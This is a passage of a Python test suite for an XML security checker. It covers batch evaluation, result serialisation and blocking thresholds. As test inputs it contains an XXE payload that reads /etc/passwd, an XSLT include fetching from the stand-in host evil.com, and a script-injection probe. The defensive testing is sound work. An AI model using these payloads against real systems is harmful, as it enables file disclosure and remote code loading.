            XMLRequest(content='<also_safe/>'),
        ]
        results = pack.evaluate_many(requests)
        assert isinstance(results, list)

    def test_evaluate_many_length_matches_input(self, pack):
        requests = [XMLRequest(content=f'<item id="{i}"/>') for i in range(5)]
        results = pack.evaluate_many(requests)
        assert len(results) == 5

    def test_evaluate_many_order_preserved(self, pack):
        """Results must be in the same order as the input requests."""
        safe = XMLRequest(content='<safe/>')
        malicious = XMLRequest(
            content='<!DOCTYPE r SYSTEM "file:///etc/passwd"><r/>'
        )
        results = pack.evaluate_many([safe, malicious])
        assert results[0].findings == []
        assert any(f.check_id == "XML-001" for f in results[1].findings)

    def test_evaluate_many_empty_list_returns_empty(self, pack):
        results = pack.evaluate_many([])
        assert results == []

    def test_evaluate_many_each_result_is_xml_eval_result(self, pack):
        requests = [XMLRequest(content='<safe/>')]
        results = pack.evaluate_many(requests)
        assert isinstance(results[0], XMLEvalResult)


# ===========================================================================
# 14. to_dict() for all dataclass types
# ===========================================================================

class TestToDict:

    def test_xml_request_to_dict_keys(self):
        req = XMLRequest(
            content='<root/>',
            content_type='text/xml',
            source_ip='1.2.3.4',
            endpoint='/api/upload',
        )
        d = req.to_dict()
        assert set(d.keys()) == {"content", "content_type", "source_ip", "endpoint"}

    def test_xml_request_to_dict_values(self):
        req = XMLRequest(
            content='<data>hello</data>',
            source_ip='10.0.0.1',
        )
        d = req.to_dict()
        assert d["content"] == '<data>hello</data>'
        assert d["source_ip"] == '10.0.0.1'
        assert d["content_type"] == "application/xml"
        assert d["endpoint"] is None

    def test_xml_finding_to_dict_keys(self):
        finding = XMLFinding(
            check_id="XML-001",
            severity="CRITICAL",
            rule_name="XXE via DOCTYPE",
            evidence="<!DOCTYPE foo",
            recommendation="Disable DOCTYPE",
        )
        d = finding.to_dict()
        assert set(d.keys()) == {
            "check_id", "severity", "rule_name", "evidence", "recommendation"
        }

    def test_xml_finding_to_dict_values(self):
        finding = XMLFinding(
            check_id="XML-006",
            severity="HIGH",
            rule_name="XSLT Injection",
            evidence="<xsl:include",
            recommendation="Block XSL directives",
        )
        d = finding.to_dict()
        assert d["check_id"] == "XML-006"
        assert d["severity"] == "HIGH"

    def test_xml_eval_result_to_dict_keys(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        d = result.to_dict()
        assert set(d.keys()) == {
            "findings", "risk_score", "blocked", "block_on_severity"
        }

    def test_xml_eval_result_to_dict_findings_are_dicts(self, pack):
        content = '<!DOCTYPE r SYSTEM "file:///etc/passwd"><r/>'
        result = pack.evaluate(XMLRequest(content=content))
        d = result.to_dict()
        assert isinstance(d["findings"], list)
        for item in d["findings"]:
            assert isinstance(item, dict)

    def test_xml_eval_result_to_dict_risk_score_type(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        d = result.to_dict()
        assert isinstance(d["risk_score"], int)

    def test_xml_eval_result_to_dict_blocked_type(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        d = result.to_dict()
        assert isinstance(d["blocked"], bool)

    def test_xml_eval_result_to_dict_block_on_severity_default(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        d = result.to_dict()
        assert d["block_on_severity"] == "HIGH"


# ===========================================================================
# 15. Constructor parameters
# ===========================================================================

class TestConstructorParams:

    def test_default_max_payload_kb_is_512(self):
        pack = XMLSecurityPack()
        assert pack._max_payload_kb == 512

    def test_default_block_on_severity_is_high(self):
        pack = XMLSecurityPack()
        assert pack._block_on_severity == "HIGH"

    def test_custom_max_payload_kb(self):
        pack = XMLSecurityPack(max_payload_kb=64)
        assert pack._max_payload_kb == 64

    def test_custom_block_on_severity(self):
        pack = XMLSecurityPack(block_on_severity="CRITICAL")
        assert pack._block_on_severity == "CRITICAL"

    def test_custom_block_severity_critical_does_not_block_on_high(self):
        """With threshold=CRITICAL, a HIGH finding must NOT set blocked=True."""
        lenient_pack = XMLSecurityPack(block_on_severity="CRITICAL")
        # XML-006 is HIGH — must not block with CRITICAL threshold
        content = '<xsl:include href="http://evil.com/x.xsl"/>'
        result = lenient_pack.evaluate(XMLRequest(content=content))
        high_findings = [f for f in result.findings if f.severity == "HIGH"]
        if high_findings and not any(
            f.severity == "CRITICAL" for f in result.findings
        ):
            assert result.blocked is False

    def test_custom_block_severity_low_blocks_on_medium(self):
        """With threshold=LOW, a MEDIUM finding must set blocked=True."""
        strict_pack = XMLSecurityPack(block_on_severity="LOW")
        content = '<root><![CDATA[<script>alert(1)</script>]]></root>'
        result = strict_pack.evaluate(XMLRequest(content=content))
        if any(f.check_id == "XML-004" for f in result.findings):
            assert result.blocked is True

    def test_pack_with_very_small_limit_fires_on_typical_request(self):
        """max_payload_kb=0 fires on any non-empty content."""
        zero_pack = XMLSecurityPack(max_payload_kb=0)
        result = zero_pack.evaluate(XMLRequest(content='<root>any</root>'))
        ids = [f.check_id for f in result.findings]
        assert "XML-005" in ids
